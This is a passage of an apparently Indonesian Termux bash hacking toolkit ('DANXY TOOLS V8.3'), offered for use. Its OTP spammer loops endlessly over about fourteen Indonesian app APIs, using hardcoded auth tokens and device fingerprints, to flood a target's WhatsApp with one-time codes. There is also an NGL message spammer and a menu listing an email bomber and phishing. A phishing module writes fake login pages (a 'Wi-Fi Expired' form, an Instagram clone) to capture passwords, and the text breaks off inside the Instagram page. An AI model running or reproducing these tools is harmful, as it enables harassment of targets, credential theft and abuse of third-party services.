⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
  RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'

  read -p "USERNAME NGL TARGET: " USERNAME
  read -p "PESAN UNTUK TARGET: " PESAN
  read -p "NOMINAL SPAM: " JUMLAH

  # URL-encode pesan agar aman di POST data
  PESAN_ENC=$(printf '%s' "$PESAN" | sed 's/ /%20/g' | sed 's/+/%2B/g')

  for ((i=1; i<=JUMLAH; i++)); do
    RESPON=$(curl -s -w "%{http_code}" -o /dev/null -X POST \
      -H "User-Agent: Termux" \
      -H "Referer: https://ngl.link/$USERNAME" \
      -d "username=$USERNAME&question=$PESAN_ENC&deviceId=termuxtest" \
      "https://ngl.link/api/submit")

    if [[ "$RESPON" == "200" ]]; then
      echo -e "${GREEN}[$i] Sukses${NC}"
    else
      echo -e "${RED}[$i] Gagal (kode: $RESPON)${NC}"
    fi
  done
}

spam_otp() {
codex(){
  tr -dc 'A-Za-z0-9' </dev/urandom | head -c "$1"
}

fetch_value(){
  local response=$1 start=$2 end=$3
  local idx=$(expr index "$response" "$start"); [[ $idx -eq 0 ]] && return
  idx=$(( idx + ${#start} ))
  local tail=${response:$idx}
  idx=$(expr index "$tail" "$end"); [[ $idx -eq 0 ]] && return
  printf '%s\n' "${tail:0:$(( idx-1 ))}"
}

# ---------- daftar API ----------
bisatopup(){
  local dev=$(codex 16)
  local url="https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=${dev}&version_name=6.12.04&version=61204"
  local payload="phone_number=$1"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url")
  [[ $(fetch_value "$res" '"message":"' '","') == "OTP akan segera dikirim ke perangkat" ]]
}

titipku(){
  local url="https://titipku.tech/v1/mobile/auth/otp?method=wa"
  local payload="{\"phone_number\": \"+62$1\", \"message_placeholder\": \"hehe\"}"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json" "$url")
  [[ $(fetch_value "$res" '"message":"' '","') == "otp sent" ]]
}

jogjakita(){
  local url_token="https://aci-user.bmsecure.id/oauth/token"
  local payload_token="grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1"
  local res_tok=$(curl -s -X POST -d "$payload_token" \
    -H "Authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    "$url_token")
  local token=$(fetch_value "$res_tok" '{"access_token":"' '","') || return 1
  local url_otp="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
  local payload='{"phone_user":"'$1'","primary_credential":{"device_id":"","fcm_token":"","id_kota":0,"id_user":0,"location":"0.0,0.0","uuid":"","version_code":"501","version_name":"6.10.1","via":"jogjakita_user"},"uuid":"00000000-4c22-250d-3006-9a465f072739","version_code":"5.01","version_name":"6.10.1","via":"jogjakita_user"}'
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json" -H "Authorization: Bearer $token" "$url_otp")
  [[ $(fetch_value "$res" '{"rc":' '","') == "200" ]]
}

candireload(){
  local url="https://app.candireload.com/apps/v8/users/req_otp_register_wa"
  local payload="{\"uuid\": \"b787045b140c631f\", \"phone\": \"$1\"}"
  local res=$(curl -s -X POST -d "$payload" \
    -H "Content-Type: application/json" \
    -H "irsauth: c6738e934fd7ed1db55322e423d81a66" \
    "$url")
  [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
}

speedcash(){
  local url_token="https://sofia.bmsecure.id/central-api/oauth/token"
  local res_tok=$(curl -s -X POST -d "grant_type=client_credentials" \
    -H "Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    "$url_token")
  local token=$(fetch_value "$res_tok" 'access_token":"' '","') || return 1
  local uuid=$(codex 8)
  local url_otp="https://sofia.bmsecure.id/central-api/sc-api/otp/generate"
  local payload="{\"version_name\":\"6.2.1 (428)\",\"phone\":\"$1\",\"appid\":\"SPEEDCASH\",\"version_code\":428,\"location\":\"0,0\",\"state\":\"REGISTER\",\"type\":\"WA\",\"app_id\":\"SPEEDCASH\",\"uuid\":\"00000000-4c22-250d-ffff-ffff${uuid}\",\"via\":\"BB ANDROID\"}"
  local res=$(curl -s -X POST -d "$payload" -H "Authorization: Bearer $token" -H "Content-Type: application/json" "$url_otp")
  [[ $(fetch_value "$res" '"rc":"' '","') == "00" ]]
}

kerbel(){
  local url="https://keranjangbelanja.co.id/api/v1/user/otp"
  local payload="----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n$1\r\n----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"otp\"\r\n\r\n118872\r\n----dio-boundary-0879576676--"
  local res=$(curl -s -X POST -d "$payload" \
    -H "content-type: multipart/form-data; boundary=--dio-boundary-0879576676" \
    "$url")
  [[ $(fetch_value "$res" '"result":"' '","') == "OTP Berhasil Dikirimkan" ]]
}

mitradelta(){
  local url="https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=$1"
  local res=$(curl -s "$url")
  [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
}

agenpayment(){
  local url_reg="https://agenpayment-app.findig.id/api/v1/user/register"
  local payload_reg="{\"name\":\"AAD\",\"phone\":\"$1\",\"email\":\"${1}@gmail.com\",\"pin\":\"1111\",\"id_propinsi\":\"5e5005024d44ff5409347111\",\"id_kabupaten\":\"5e614009360fed7c1263fdf6\",\"id_kecamatan\":\"5e614059360fed7c12653764\",\"alamat\":\"aceh\",\"nama_toko\":\"QUARD\",\"alamat_toko\":\"aceh\"}"
  local res_reg=$(curl -s -X POST -d "$payload_reg" \
    -H "content-type: application/json; charset=utf-8" \
    -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
    "$url_reg")
  [[ $(fetch_value "$res_reg" '{"status":' '","') == "200" ]] || return 1

  local url_login="https://agenpayment-app.findig.id/api/v1/user/login"
  local payload_login="{\"phone\":\"$1\",\"pin\":\"1111\"}"
  local res_login=$(curl -s -X POST -d "$payload_login" \
    -H "content-type: application/json; charset=utf-8" \
    -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
    "$url_login")
  local vid=$(fetch_value "$res_login" 'validate_id":"' '",') || return 1

  local url_otp="https://agenpayment-app.findig.id/api/v1/user/login/send-otp"
  local payload_otp="{\"codeLength\":4,\"validate_id\":\"$vid\",\"type\":\"whatsapp\"}"
  local res=$(curl -s -X POST -d "$payload_otp" \
    -H "content-type: application/json; charset=utf-8" \
    -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
    "$url_otp")
  [[ $(fetch_value "$res" '{"status":' '","') == "200" ]]
}

z4reload(){
  local url="https://api.irmastore.id/apps/otp/v2/sendotpwa"
  local payload="{\"hp\":\"$1\",\"uuid\":\"MyT2H1xFo2WHoMT5gjdo3W9woys1\",\"app_code\":\"z4reload\"}"
  local res=$(curl -s -X POST -d "$payload" \
    -H "content-type: application/json" \
    -H "authorization: 7117c8f459a98282c2c576b519d0662f" \
    "$url")
  [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
}

singa(){
  local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
  local payload="{\"mobile_phone\":\"$1\",\"type\":\"mobile\",\"is_switchable\":1}"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url")
  [[ $(fetch_value "$res" '"msg":"' '","') == "Success" ]]
}

ktakilat(){
  local url="https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode"
  local payload="{\"mobileNo\":\"$1\",\"smsType\":1}"
  local headers=(
    "Content-Type: application/json; charset=UTF-8"
    "Device-Info: eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0="
  )
  local res=$(curl -s -X POST -d "$payload" "${headers[@]/#/-H }" "$url")
  [[ $(fetch_value "$res" '"msg":"' '","') == "success" ]]
}

uangme(){
  local aid="gaid_15497a9b-2669-42cf-ad10-$(codex 12)"
  local url="https://api.uangme.com/api/v2/sms_code?phone=$1&scene_type=login&send_type=wp"
  local headers=(
    "aid:$aid"
    "android_id:b787045b140c631f"
    "app_version:300504"
    "brand:samsung"
    "carrier:00"
    "Content-Type:application/x-www-form-urlencoded"
    "country:510"
    "dfp:6F95F26E1EEBEC8A1FE4BE741D826AB0"
    "fcm_reg_id:frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo"
    "gaid:gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0"
    "lan:in_ID"
    "model:SM-G965N"
    "ns:wifi"
    "os:1"
    "timestamp:1732178536"
    "tz:Asia%2FBangkok"
    "User-Agent:okhttp/3.12.1"
    "v:1"
    "version:28"
  )
  local res=$(curl -s "${headers[@]/#/-H }" "$url")
  [[ $(fetch_value "$res" '{"code":"' '","') == "200" ]]
}

cairin(){
  local uuid=$(codex 32)
  local url="https://app.cairin.id/v2/app/sms/sendWhatAPPOPT"
  local payload="appVersion=3.0.4&phone=$1&userImei=$uuid"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url")
  [[ $res == '{"code":"0"}' ]]
}

adiraku(){
  local url="https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
  local payload="{\"mobileNumber\":\"$1\",\"type\":\"prospect-create\",\"channel\":\"whatsapp\"}"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url")
  [[ $(fetch_value "$res" '{"message":"' '","') == "success" ]]
}

# ---------- spammer ----------
spam_whatsapp(){
  local nomor=$1
  local apis=(
    bisatopup
    titipku
    jogjakita
    candireload
    speedcash
    kerbel
    mitradelta
    agenpayment
    z4reload
    singa
    ktakilat
    uangme
    cairin
    adiraku
  )
  for api in "${apis[@]}"; do
    if "$api" "$nomor" 2>/dev/null; then
      printf "[ ${RED}∅${NC} ] %-14s → ${RED}GAGAL${NC}\n" "$api"
    else
      printf "[ ${GREEN}✓${NC} ] %-14s → ${GREEN}%s${NC}\n" "$api" "$nomor"
      
    fi
  done
}


# ---------- UI ----------
clear
echo -e "\n\n        ${RED}░██████╗░░░░█████╗░████████╗██████╗░
        ██╔════╝░░░██╔══██╗╚══██╔══╝██╔══██╗
        ╚█████╗░░░░██║░░██║░░░██║░░░██████╔╝${NC}"
echo -e "        ${WHITE}░╚═══██╗░░░██║░░██║░░░██║░░░██╔═══╝░
        ██████╔╝██╗╚█████╔╝░░░██║░░░██║░░░░░
        ╚═════╝░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░${NC}"
echo -e "     ${RED}╭────────────────────────────────────────╮${RED}
     │           ${GREEN}SPAM OTP UNLIMITED${NC}${RED}           │
     ╰────────────────────────────────────────╯${NC}"
echo -e "   ${BG_RED}${YELLOW}TEKAN q LALU ENTER UNTUK MENGHENTIKAN SPAM OTP${NC}\n"
trap 'echo -e "\n\n${YELLOW}Pengiriman dihentikan.${NC}"; exit 0' INT
while true; do
  echo -e "   ${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "   ${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
    printf "   ${GREEN}┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} S.OTP ${YELLOW}${RED}]${NC}${GREEN}\n   ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
           read -r nomor
  [[ $nomor == [Qq] || -z $nomor ]] && break
  [[ ! $nomor =~ ^62[0-9]+$ ]] && { echo -e "${YELLOW}Nomor harus dimulai dengan 62 dan hanya angka.${NC}"; continue; }

  while true; do
    read -t 0.2 -n 1 key && [[ $key == [Qq] || $key == "" ]] && break 2
    spam_whatsapp "$nomor"
    sleep 2
  done
done
}
generate_password() {
    read -p "Masukkan panjang password yang diinginkan: " length

    # Validasi input panjang password
    if ! [[ "$length" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}Panjang password harus berupa angka.${NC}"
        return 1
    fi

    if [[ "$length" -lt 8 ]]; then
        echo -e "${RED}Panjang password minimal 8 karakter.${NC}"
        return 1
    fi

    echo -e "${YELLOW}
  ╭────────────────────────────────────────╮
  │        ${CYAN}MENGENERATE PASSWORD${YELLOW}           │
  ╰────────────────────────────────────────╯${NC}"

    # Generate password menggunakan openssl
    password=$(openssl rand -base64 "$((length * 3 / 4))" | head -c "$length")
    loading

    echo -e "${GREEN}Password yang dihasilkan: ${CYAN}$password${NC}"

    echo -e "${CYAN}
  ╭──────────────────────────────────────── ╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
}
banner_big() {
  clear
  cat << "EOF"
       ________               __      ______                __  
      / ____/ /_  ____  _____/ /_    /_  __/________ ______/ /__
     / / __/ __ \/ __ \/ ___/ __/_____/ / / ___/ __ `/ ___/ //_/
    / /_/ / / / / /_/ (__  ) /_/_____/ / / /  / /_/ / /__/ ,<   
    \____/_/ /_/\____/____/\__/     /_/ /_/   \__,_/\___/_/|_| 

              [ + ]  C O D E   B Y  D A N X Y  [ + ]
EOF
}
menu_tracking() {
  while true; do
clear
  if command_exists figlet; then
    figlet -f slant " Tracking" | lolcat
  else
    echo -e "${CYAN}  ===== DanxyTols =====${NC}"
    sleep 1
    clear
  fi
     echo -e "  ${BG_RED}${YELLOW}MENU KE 2 DANXY TOOLS${NC}"
     echo -e "
 ╭───────────────────────────────────────────────╮
 │                                               │
 ╭─────────────┬────────────────────────────┬────╮
 │  [   01   ] │ IP Tracker (GeoIP + ISP)   │    │
 │  [   02   ] │ Tracking Phising (link)    │    │
 │  [   03   ] │ Email Bomber  (WORK)       │    │
 │  [   04   ] │ Tracking NIK V2            │    │
 │  [   05   ] │ Tracking Info Domain       │    │
 │  [   06   ] │ Nmap Lite                  │    │
 │  [   07   ] │ IP TRACK                   │    │
 │  [   08   ] │ Track lksi foto di ambil   │    │
 │  [   09   ] │ Cracker Pw .Zip            │    │ 
 │  [   10   ] │ PHISING ALL SOSMED         │    │ 
 │  [   11   ] │ PHONE TRACK                │    │ 
 │  [   00   ] │ KEMBALI KE MENU AWAL       │    │
 ╰─────────────┴────────────────────────────┴────╯
 │                                               │
 ╰───────────────────────────────────────────────╯" | lolcat
   echo -e "${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
        printf "${GREEN}┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${RED} ~${NC}${RED}[${YELLOW} TRACKING ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r pilih

    case $pilih in
    
        01|1)
        klik
        GeoIP_ISP
        klik
        ;;
        02|2)
        klik
        track_live
        klik
        ;;
        03|3)
        klik
         spam_gmail
         klik
        ;;
        04|4)
        klik
         Nik_cek
         klik
        ;;
        05|5)
        klik
         whois_lookup
         klik
        ;;
        06|6)
        klik
         port_scan
         klik
        ;;
        07|7)
        klik
         ip_track
         klik
        ;;
        08|8)
        klik
         exif_tool
         klik
        ;;
        09|9)
        klik
         bruteforce_zip
         klik
        ;;
       10)
       klik
        phising_allsosmed
        klik
        ;;
       11)
       klik
        phone_track
        klik
       ;;
      00|0)
      klik
        echo "CLOSE MENU 2" | lolcat
        break
        klik
        ;;
      *)
        echo "INPUT TIDAK VALID!" | lolcat
        salah
        ;;
    esac

    echo ""
    read -p "ENTER UNTUK KEMBALI KE MENU" | lolcat
    klik
  done
}

phone_track() {
banner_big
  echo -ne "\n${WHT}Enter phone number target ${GRN}Ex [+6281xxxxxxxxx] ${WHT}: ${GRN}"
  read -r phone
  echo -e "\n${WHT}========== ${GRN}SHOW INFORMATION PHONE NUMBERS ${WHT}=========="
  # Using libphonenumber-js via node (install with: npm i -g libphonenumber-js)
  node - << "EOF" "$phone"
const parsePhoneNumber = require('libphonenumber-js');
const input = process.argv[2];
try {
  const pn = parsePhoneNumber(input);
  if (!pn) { console.log('Invalid number'); process.exit(1); }
  console.log(`Location             : ${pn.getRegionCode()}`);
  console.log(`Carrier              : ${pn.getCarrierCode() || 'N/A'}`);
  console.log(`Valid number         : ${pn.isValid()}`);
  console.log(`International format : ${pn.formatInternational()}`);
  console.log(`E.164 format         : ${pn.format('E164')}`);
  console.log(`Type                 : ${pn.getType()}`);
} catch (e) {
  console.error('Error parsing number', e.message);
}
EOF
}
ip_track() {
banner_big

  echo -ne "\n${WHT}Enter IP target : ${GRN}"
  read -r ip
  echo -e "\n${WHT}============= ${GRN}SHOW INFORMATION IP ADDRESS ${WHT}=============${RST}"
  data=$(curl -s "http://ipwho.is/${ip}")
  echo -e "${WHT}\n IP target       : ${GRN}${ip}"
  echo -e "${WHT} Type IP         : ${GRN}$(echo "$data" | jq -r '.type')"
  echo -e "${WHT} Country         : ${GRN}$(echo "$data" | jq -r '.country')"
  echo -e "${WHT} Country Code    : ${GRN}$(echo "$data" | jq -r '.country_code')"
  echo -e "${WHT} City            : ${GRN}$(echo "$data" | jq -r '.city')"
  echo -e "${WHT} Continent       : ${GRN}$(echo "$data" | jq -r '.continent')"
  echo -e "${WHT} Continent Code  : ${GRN}$(echo "$data" | jq -r '.continent_code')"
  echo -e "${WHT} Region          : ${GRN}$(echo "$data" | jq -r '.region')"
  echo -e "${WHT} Region Code     : ${GRN}$(echo "$data" | jq -r '.region_code')"
  echo -e "${WHT} Latitude        : ${GRN}$(echo "$data" | jq -r '.latitude')"
  echo -e "${WHT} Longitude       : ${GRN}$(echo "$data" | jq -r '.longitude')"
  lat=$(echo "$data" | jq -r '.latitude')
  lon=$(echo "$data" | jq -r '.longitude')
  echo -e "${WHT} Maps            : ${GRN}https://www.google.com/maps/@${lat},${lon},8z"
  echo -e "${WHT} EU              : ${GRN}$(echo "$data" | jq -r '.is_eu')"
  echo -e "${WHT} Postal          : ${GRN}$(echo "$data" | jq -r '.postal')"
  echo -e "${WHT} Calling Code    : ${GRN}$(echo "$data" | jq -r '.calling_code')"
  echo -e "${WHT} Capital         : ${GRN}$(echo "$data" | jq -r '.capital')"
  echo -e "${WHT} Borders         : ${GRN}$(echo "$data" | jq -r '.borders')"
  echo -e "${WHT} Country Flag    : ${GRN}$(echo "$data" | jq -r '.flag.emoji')"
  echo -e "${WHT} ASN             : ${GRN}$(echo "$data" | jq -r '.connection.asn')"
  echo -e "${WHT} ORG             : ${GRN}$(echo "$data" | jq -r '.connection.org')"
  echo -e "${WHT} ISP             : ${GRN}$(echo "$data" | jq -r '.connection.isp')"
  echo -e "${WHT} Domain          : ${GRN}$(echo "$data" | jq -r '.connection.domain')"
  echo -e "${WHT} Timezone ID     : ${GRN}$(echo "$data" | jq -r '.timezone.id')"
  echo -e "${WHT} ABBR            : ${GRN}$(echo "$data" | jq -r '.timezone.abbr')"
  echo -e "${WHT} DST             : ${GRN}$(echo "$data" | jq -r '.timezone.is_dst')"
  echo -e "${WHT} Offset          : ${GRN}$(echo "$data" | jq -r '.timezone.offset')"
  echo -e "${WHT} UTC             : ${GRN}$(echo "$data" | jq -r '.timezone.utc')"
  echo -e "${WHT} Current Time    : ${GRN}$(echo "$data" | jq -r '.timezone.current_time')"
}

#!/bin/bash
phising_allsosmed() {
    # ---------- warna ----------
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'; CYAN='\033[0;36m'; RESET='\033[0m'
    clear
    echo -e "${CYAN}"
    figlet -f small "ShellPhish-Lite" 2>/dev/null || echo -e "=== ShellPhish-Lite ===\n"
    echo -e "${RESET}"

    # ---------- dependensi ----------
    for dep in php curl openssh; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${YELLOW}[+] Installing $dep...${RESET}"
            pkg install "$dep" -y || apt install "$dep" -y
        fi
    done

    # ---------- daftar target ----------
    sites=(
        "instagram" "facebook" "twitter" "google" "netflix"
        "snapchat" "github" "spotify" "linkedin"
        "yahoo" "microsoft" "create"
    )

    echo -e "${GREEN}Pilih target:${RESET}"
    for i in "${!sites[@]}"; do
        printf "%2s) %-15s" "$((i+1))" "${sites[$i]}"
        (( (i+1) % 3 == 0 )) && echo
    done
    echo

    read -p "Pilih [1-${#sites[@]}]: " opt
    [[ ! "$opt" =~ ^[0-9]+$ ]] || (( opt < 1 || opt > ${#sites[@]} )) && {
        echo -e "${RED}Pilihan salah!${RESET}"
        return 1
    }

    server="${sites[$((opt-1))]}"

    # ---------- custom page ----------
    [[ "$server" == "create" ]] && {
        mkdir -p sites/create
        cat > sites/create/index.html <<'EOF'
<!DOCTYPE html>
<html><body bgcolor="#2c3e50" text="#ecf0f1">
<center><h2>Wi-Fi Expired<br>Please login again.</h2></center>
<form method="POST" action="login.php">
<label>Username: </label><input name="username"><br>
<label>Password: </label><input type="password" name="password"><br><br>
<input type="submit" value="Log-In">
</form></body></html>
EOF
    }

    # ---------- folder kerja ----------
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)" || SCRIPT_DIR="$PWD"
    LOG_DIR="$SCRIPT_DIR/logs"
    mkdir -p "$LOG_DIR"

    port=3333
    dir="sites/$server"
    mkdir -p "$dir"
    cd "$dir" || { echo -e "${RED}Gagal masuk ke $dir${RESET}"; return 1; }

    # ---------- template 1:1 sesuai target ----------
    case "$server" in
        instagram)
            cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Instagram</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
<style>body{background:#fafafa;font-family:'Roboto',sans-serif;margin:0}.wrapper{max-width:350px;margin:60px auto;padding:0 20px}.logo{width:100%;max-width:175px;margin-bottom:30px}.box{background:#fff;border:1px solid #dbdbdb;padding:40px 30px;text-align:center;border-radius:3px}input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px}button{width:100%;padding:8px;background:#0095f6;border:none;border-radius:4px;color:#fff;font-weight:600;margin-top:10px;font-size:14px;cursor:pointer}.footer{margin-top:40px;color:#8e8e8e;font-size:12px;text-align:center}a{color:#00376b;text-decoration:none;font-weight:600}</style></head><body>
<div class="wrapper"><div class="box">
